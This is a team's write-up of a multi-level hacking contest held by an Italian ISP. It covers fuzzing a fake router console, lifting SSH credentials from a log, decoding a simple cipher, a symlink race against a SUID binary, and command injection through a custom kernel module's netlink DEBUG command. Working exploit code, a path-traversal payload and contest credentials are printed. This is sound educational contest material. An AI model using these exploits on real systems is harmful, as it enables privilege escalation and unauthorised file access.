### Solved by Swappage

During the past two weeks, an italian ISP: seeweb, held a 2 weeks hacking contest, it was similar to the vulnhub boot to root VMs, more then to a CTF, except that it was involving more targets hosted by the ISP itself.

The fastest to provide a solution for each of the three levels would receive prizes.

We decided to give it a shot and here is our writeup.

## Level 0: The Router

Upon signup, players would receive an email containing the ip address of the first target

After a quick scan with Nmap we figured out that two ports were open:

    PORT      STATE    SERVICE VERSION
    135/tcp   filtered msrpc
    65533/tcp open     unknown
    65534/tcp open     ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)

Leaving port 65534 apart, on which ssh was listening, what was left was a custom service running on port 65533

upon connection we were presented with the following outout

    ____   _____   ______                                        _   _
    / __ \ / ____| |  ____|                                      | | (_)
    | |  | | |      | |__ __ _ _ __ _ __ ___   __ _  ___ ___ _   _| |_ _  ___
    | |  | | |      |  __/ _` | '__| '_ ` _ \ / _` |/ __/ _ \ | | | __| |/ __|
    | |__| | |____  | | | (_| | |  | | | | | | (_| | (_|  __/ |_| | |_| | (__
    \____\_\_____| |_|  \__,_|_|  |_| |_| |_|\__,_|\___\___|\__,_|\__|_|\___|


    ###############################################################################
    #     WARNING                                                                 #
    #     Unauthorized access to this system is absolutely forbidden and might    #
    #     be prosecuted by law. By accessing this system, you agree that your     #
    #     actions may be monitored if unauthorized usage is suspected.            #
    ###############################################################################

    1) Interfaces setup
    2) Logging
    3) Proxy
    4) Email Security
    5) Reset console password
    6) Reset to factory defaults
    7) Reboot system
    8) Logout

    Enter a number:

This was honestly the weirdest challenge i've ever faced in a long time, and which left me without ideas for a while.

Only after a while i decided that it was time to try fuzzing it hard and eventually discovered the fake vulnerability which would allow me to procede in the game.

The challenge pretended to simulate a buffer overflow, but honestly who would have expected that? all the challenges involving binary exploitation are giving out the binary to reverse/fuzz/play with in a debugger, while this one didn't and was expecting us just to fuzz it hard.

The *fake* (because i actually think it's not a real BoF) vuln would trigger by entering a in the 4th menu, request to modify a parameter, and specify an overly long password when prompted.

This would simulate a stack smashing attempt and drop you into a *management menu* where you could perform other tasks

    Enter a number: 4

    Current configuration:

    service      status
    Anti-Virus   active
    Anti-spam    active
    Anti-spyware active
    Encryption   inactive

    1) Edit configuration
    2) Back

    Enter a number: 1

    This task require administrative credentials.
    Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.....

        *** stack smashing detected ***: CNDm terminated
    ======= Backtrace: =========
    /lib/tls/i686/cmov/libc.so.6(__fortify_fail+0x50)
    /lib/tls/i686/cmov/libc.so.6(0xd5b1c8ff)
    ======= Memory map: ========
    00110000-00134000 r-xp 00000000 08:01 538008     /lib/libm-2.11.1.so
    00134000-00135000 r--p 00023000 08:01 538008     /lib/libm-2.11.1.so
    00135000-00136000 rw-p 00024000 08:01 538008     /lib/libm-2.11.1.so
    00136000-00289000 r-xp 00000000 08:01 538006     /lib/libc-2.11.1.so
    00289000-0028b000 r--p 00153000 08:01 538006     /lib/libc-2.11.1.so
    0028b000-0028c000 rw-p 00155000 08:01 538006     /lib/libc-2.11.1.so
    0028c000-0028f000 rw-p 00000000 00:00 0
    002b0000-002cd000 r-xp 00000000 08:01 393243     /lib/libgcc_s.so.1
    002cd000-002ce000 r--p 0001c000 08:01 393243     /lib/libgcc_s.so.1
    002ce000-002cf000 rw-p 0001d000 08:01 393243     /lib/libgcc_s.so.1
    00ac8000-00ae3000 r-xp 00000000 08:01 405084     /lib/ld-2.11.1.so
    00ae3000-00ae4000 r--p 0001a000 08:01 405084     /lib/ld-2.11.1.so
    00ae4000-00ae5000 rw-p 0001b000 08:01 405084     /lib/ld-2.11.1.so
    00ebb000-00ebc000 r-xp 00000000 00:00 0          [vdso]
    09d31000-09d52000 rw-p 00000000 00:00 0          [heap]
    b77d0000-b77d2000 rw-p 00000000 00:00 0
    b77e1000-b77e4000 rw-p 00000000 00:00 0
    bfd8c000-bfda1000 rw-p 00000000 00:00 0          [stack]


    BusyBox v0.60 (2015.06.04-12:18+0000) Built-in shell (ksh)

    Built-in commands:
    ------------------

    1) Show context
    2) Show environment
    3) Show memory
    4) Show log
    5) Show hardware
    6) EXEC command
    7) Test FLASH
    8) Reboot system
    9) Logout


Trying to execute a command, which is the first that came to mind, didn't work, and would drop an hint about the filesystem being read only.
This suggested me to check for the log and see if i could find something useful.

The log contained what looked like an SSH bruteforce attempt, i save you from pasting it here as it's a bit long, but by looking at the log it was possible to figure out that some sort of dictionary attack was undergoing with passwords being used as usernames.

with some grepping we managed to figure out that the username and password for logging in via SSH to the box were the following

    Invalid user FTcc..sb1 from 212.25.179.164
    Accepted password for kermit from 212.25.179.164 port 39157 ssh2

    username: kermit
    password: FTcc..sb1


By logging in to the server via SSH we were provided with an encrypted message, a map file for decryption, and an encrypted zip file containing the informations to procede to the next target.

    $ ls -la
    total 20
    drwxr-xr-x 2 kermit root 4096 Apr 12 14:35 .
    drwxr-xr-x 3 root   root 4096 Apr 10 12:02 ..
    -rw-r--r-- 1 root   root  145 Apr 12 14:32 map
    -rw-r--r-- 1 root   root  581 Apr 12 19:26 msg
    -rw-r--r-- 1 root   root  347 Apr 11 12:12 next_target.zip


## Level 1: The Black Hat encrypted message

The first question to solve for the contest was to decrypt the message left by the black hats on the server of Quality Cloud Farmaceutics.

We were provided with the following encrypted text and the decryption map

    $ cat msg map
    88181890981263980

    5149563718743156045654400456529565598850728282456505543456524956830488575651435689275689262374725662956559553281956965417814398895652200456865040935856880150525654478148825039885625651495652288152954988431569056812555548484915688954743156885125651466156045588943156620565595532814

    51488572525683585683048857565143568872598056592564725640594585556160962568350356628727568972552638556549652565055561756592565990056881639650256315652955750893565815080

    505545686502553456894555559175256892756488882522725640563501568971555598115618392339871

    53895954574812259786

    -----------------------
    | |0|1|2|3|4|5|6|7|8|9|
    | |l|o|e|t|a| |n|r| |i|
    |5|u|h|d|j|f|s| |k|y|w|
    |8|.|m|z|b|g|,|q|v|c|p|
-----------------------

The cipher here is pretty simple.

Clear text is decoded by taking numbers from the ciphertext at pairs, and check the corresponding cleartext character in the map, with an exception: numbers were to pick alone if they weren't starting with 5 or 8.

Well, this is easier shown then explained.

For example

    88181890981263980

decodes as "complimenti" like this

     88 1 81 89 0 9 81 2 6 3 9 80

     88 = c
     1 = o
     0 = m
     ....

and so on.

Applying this to the whole ciphertext will give us the cleartext message and the password to uncompress the next_target.zip archive

    complimenti.

    hai trovato la falla di sicurezza usata dai black hat per penetrare nei sistemi informatici della quality cloud e hai
    decodificato il messaggio cifrato che hanno lasciato nel sistema

    hacked by black hat crew. we are always online but never present, find us or we will continue to disrupt you.

    usa questa password per accedere al tuo prossimo obiettivo

    jpwfkameewrq

Wow, this sounds so '90s :)


## level 2: The vaccine formula

For our second task we were asked to retrieve a flag, consisting of a *secret vaccine formula*

To do so, we needed to exploit a SUID binary which was running as root and read the flag

I started by downloading the binary locally and looking at it closely.

The binary was an x64 elf, and it wasn't stripped! (woohoo!), this meant we had all the functions symbols helping us in understanding what it was doing.

    ./gmanager:  User Commands

    NAME
    ./gmanager

    SYNOPSIS
    ./gmanager [OPTION]...

    -g
    Generate token

    -c
    Check connectivity

    -r
    Read log file

    -s
    Check users currently logged into the sandbox

    -d <display_number>
    Open remote console

    -a <module_name>
    Attach to loaded systemtap module

Most of the functions here were meant as a decoy, even if we were asked to read the flag, the -r flag for reading log files were abolutely useless, instead the function of interest was the one that was triggered when the -s flag was specified.

Here is the pseudocode:

```c
function func_s {
    var_4 = 0x0;
    printf("Username: ");
    __isoc99_scanf();
    var_8 = LODWORD(stat_and_access("./utmp.log"));
    if (var_8 == 0x0) goto loc_4013bc;
    goto loc_40139e;

loc_4013bc:
    var_8 = LODWORD(stat_and_access("./wtmp.log"));
    if (var_8 == 0x0) goto loc_4013ed;
    goto loc_4013cf;

loc_4013ed:
    sleep(0x1);
    var_C = LODWORD(stat("./lastlog", var_4B0));
    if (var_C != 0x0) goto loc_4014bc;
    goto loc_401418;

loc_4014bc:
    rax = puts("\n**never logged in**\n");
    return rax;

loc_401418:
    rax = access("./lastlog", 0x2);
    if (LODWORD(rax) != 0x0) goto loc_4014a8;
    goto loc_40142b;

loc_4014a8:
    puts("Hacking attempt! Exiting...\n");
    rax = exit(0x0);

loc_40142b:
    sleep(0x2);
    var_18 = fopen("./lastlog", 0x401c3b);
    if (var_18 != 0x0) {
            do {
                    rax = feof(var_18);
                    if (LODWORD(rax) != 0x0) {
                        break;
                    }
                    fread(var_420, 0x400, 0x1, var_18);
                    printf(0x401c3d);
            } while (true);
            fclose(var_18);
    }
    goto loc_4014bc;

loc_4013cf:
    puts("Hacking attempt! Exiting...\n");
    sleep(0x2);
    rax = exit(0x0);

loc_40139e:
    puts("Hacking attempt! Exiting...\n");
    sleep(0x2);
    rax = exit(0x0);
}
```

What we need to do is to reach *loc_40142b*, which reads the lastlog file in our current working directory: this can be exploited to read our flag by creating a symbolic link to the flag and having the program read it for us instead of lastlog.

But not so quickly, because the program tries to verify if we are trying to read from a symlink and exits at *loc_401418*

Still the program isn't really clever in checking if we are messing up with symlinks, as it uses the function *access()*, which simply checks the permissions on the file, and returns 0 if every permission (rwx) is available to the process for the file.

This means we can still trick the application to read our flag via a symlink by attempting a race condition attack: we create a file named lastlog, remove some permissions from it so that *access()* would return an error, and then once the check is passed we remove the file and replace it with a symlink to our flag; to note that the portion of code that actually reads the file uses *sleep()* to make our life even easier.

```c
loc_40142b:
    sleep(0x2);
    var_18 = fopen("./lastlog", 0x401c3b);
    if (var_18 != 0x0) {
            do {
                    rax = feof(var_18);
                    if (LODWORD(rax) != 0x0) {
                        break;
                    }
                    fread(var_420, 0x400, 0x1, var_18);
                    printf(0x401c3d);
            } while (true);
            fclose(var_18);
    }
    goto loc_4014bc;
```

fingers crossed and:

    public@Healing:/tmp/.swp$ ls -la lastlog
    lrwxrwxrwx 1 public public 25 Apr 26 22:29 lastlog -> /home/monday/antigene_sbc

    public@Healing:/tmp/.swp$ /usr/bin/gmanager -s
    Username: 1234
    Complimenti!
    Sei riuscito a recuperare in tempo la formula del vaccino di nuova generazione su cui stava lavorando la Quality Cloud Farmaceutic.
    Di seguito sono riportate le sostanze usate, con le opportune caratteristiche:

    - Acido Acetilsalicilico, formula bruta C7H6O3, P molecolare 138 uma, d=140 g/cm3
    - Anidride Acetica , formula bruta C4H6O3, P molecolare 109 uma, d=1,08 g/cm3
    - Acido acetilsalicilico, formula bruta C9H8O4, P molecolare=180 uma, d=1,35 g/cm3
    - Acido acetico, formula bruta C2H4O2, P molecolare 60 uma,d 1,05 g/cm3


    Il tuo prossimo obiettivo:

    hostname: 212.25.162.9
    username: anonymous
    password: fe7feeng

    Ottieni le informazioni contenute in /etc/BlackoutResurrection

    **never logged in**


## Level 3: The Black Hat hideout

In this third and last target, our objective was to unveal the location of the black hat secret hideout, again this was a file only readable by root and the user proxy, and we needed to find a way to escalate to proxy to read it.

To accomplish this we had to exploit a flaw in a custom kernel module named *context_switcher* which was loaded in the kernel space.

The sources were available in the /develop directory on the target system and are as follows:

```c
#include <linux/module.h>
#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <linux/kmod.h>
#include <linux/string.h>

#define NETLINK_USER 31
#define DEBUG   1


struct sock *nl_sk = NULL;


static void task_nl_recv_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlh;
    int pid;
    struct sk_buff *skb_out;
    int msg_size;
    char *msg="Message from Kernel";
    int res;


    msg_size=strlen(msg);

    nlh=(struct nlmsghdr*)skb->data;
    pid = nlh->nlmsg_pid;



    char *comm;
    char *arg;
    const char tag[2] = "=";
    char *token;
    char *stringa = (char*)nlmsg_data(nlh);


    token = strsep(&stringa, tag);
    if ( token != NULL ){
        comm=token;
        token = strsep(&stringa, tag);

        if (token != NULL){
            arg=token;

            if (!strncmp(comm,"LIST",4))
            {
                struct task_struct *task;

                for_each_process(task){
                    pr_info("COMM: %s PID: %d NIVCSW: %lu NVCSW: %lu", task->comm, task->pid, task->nivcsw, task->nvcsw);

                    skb_out = nlmsg_new(msg_size,0);

                    if(!skb_out)
                    {
                        printk(KERN_ERR "Failed to allocate new skb\n");
                        return;
                    }
                    nlh=nlmsg_put(skb_out,0,0,NLMSG_DONE,sizeof(unsigned int),0);

                    NETLINK_CB(skb_out).dst_group = 0; /* not in mcast group */
                    snprintf(nlmsg_data(nlh),sizeof(unsigned int),"%lu",task->nvcsw);

                    res=nlmsg_unicast(nl_sk,skb_out,pid);

                    if(res<0)
                        printk(KERN_INFO "Error while sending bak to user\n");

                }
            }

#ifdef DEBUG
#define DGB_TOOL "/usr/share/nl/"

            else if (!strncmp(comm,"DEBUG",5))
            {
                char scpt[1024];
                memset(scpt,'\0',sizeof(scpt));
                strncat(scpt,DGB_TOOL,strlen(DGB_TOOL));
                strncat(scpt,arg,sizeof(scpt)-strlen(DGB_TOOL)-1);

                char *debug[] = { "\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x73\x75\x64\x6f",
                    "\x2d\x75",
                    "\x23\x31\x33",
                    "\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68",
                    "\x2d\x63",
                    scpt,
                    "\x4e\x55\x4c\x4c" };

                call_usermodehelper(debug[0], debug, NULL, UMH_WAIT_EXEC);

            }
#endif
        }
    }




}


static int __init nl_module_init(void)
{
    printk("Entering: %s\n",__FUNCTION__);
    nl_sk=netlink_kernel_create(&init_net, NETLINK_USER, 0, task_nl_recv_msg, NULL, THIS_MODULE);
    if(!nl_sk)
    {
        printk(KERN_ALERT "Error creating socket.\n");
        return -10;
    }
    return 0;
}

static void __exit nl_module_exit(void){
    printk(KERN_INFO "exiting hello module\n");
    netlink_kernel_release(nl_sk);
}

module_init(nl_module_init);
module_exit(nl_module_exit);

MODULE_LICENSE("GPL");

```

Again, nothing really hardcore: we could gain privileged code execution in the kernel context by sending a message to the kernel via a socket like the following

    DEBUG=../../../../path/to/our/payload

and this would be appended to the hex encoded debugging routine becoming:

    /usr/bin/sudo -u #13 /bin/bash -c ../../../../path/to/our/payload

to get executed by *call_usermodehelper()*

The following C code was used to interact with the kernel and retrieve the flag

```c
#include <sys/socket.h>
#include <linux/netlink.h>

#define NETLINK_USER 31

#define MAX_PAYLOAD 1024 /* maximum payload size*/
struct sockaddr_nl src_addr, dest_addr;
struct nlmsghdr *nlh = NULL;
struct iovec iov;
int sock_fd;
struct msghdr msg;

void main(int argc, char *argv[])
{
    sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_USER);
    if (sock_fd < 0)
        return -1;

    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.nl_family = AF_NETLINK;
    src_addr.nl_pid = getpid(); /* self pid */

    bind(sock_fd, (struct sockaddr *)&src_addr, sizeof(src_addr));

    memset(&dest_addr, 0, sizeof(dest_addr));
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;
    dest_addr.nl_pid = 0; /* For Linux Kernel */
    dest_addr.nl_groups = 0; /* unicast */

    nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
    memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
    nlh->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = 0;

    strcpy(NLMSG_DATA(nlh), argv[1]);

    iov.iov_base = (void *)nlh;
    iov.iov_len = nlh->nlmsg_len;
    msg.msg_name = (void *)&dest_addr;
    msg.msg_namelen = sizeof(dest_addr);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    printf("Sending message to kernel\n");
    sendmsg(sock_fd, &msg, 0);
    printf("Waiting for message from kernel\n");

    /* Read message from kernel */
    recvmsg(sock_fd, &msg, 0);
    printf("Received message payload: %s\n", NLMSG_DATA(nlh));
    close(sock_fd);
}
```

with a bash script like this as an helper

```bash
#!/bin/bash
touch /var/tmp/tmp/.swp/test
chmod 777 /var/tmp/tmp/.swp/test
cat /etc/BlackoutResurrection > /var/tmp/tmp/.swp/test
```

as it's possible to notice, the script was executed by the kernel using sudo as the user proxy and returned the flag

    anonymous@BlackoutResurrection:/var/tmp/tmp/.swp$ ./programma2 DEBUG=../../../var/tmp/tmp/.swp/test.sh
    Sending message to kernel
    Waiting for message from kernel
    ^C
    [Exit 130 (SIGINT)]
    anonymous@BlackoutResurrection:/var/tmp/tmp/.swp$ ls -la
    total 604
    drwxr-xr-x 2 anonymous anonymous   4096 Apr 26 23:17 ./
    drwxr-xr-x 3 anonymous anonymous   4096 Apr 26 22:55 ../
    -rwxr-xr-x 1 anonymous anonymous 594527 Apr 26 22:56 programma2*
    -rwxrwxrwx 1 anonymous anonymous    287 Apr 26 23:18 test*
    -rwxr-xr-x 1 anonymous anonymous     68 Apr 26 23:17 test.sh*
    anonymous@BlackoutResurrection:/var/tmp/tmp/.swp$ cat test
    Complimenti!
    Sei riuscito a localizzare il covo hacker in cui sono tenuti i dispositivi contenenti informazioni riservate della Quality Cloud Farmaceutic.

    Indirizzo: Finsbury Park, Greater London, Inghilterra
    Codice Postale: N4
    Latitudine: 51.5647
    Longitudine: -0.1064
    Precisione: 4

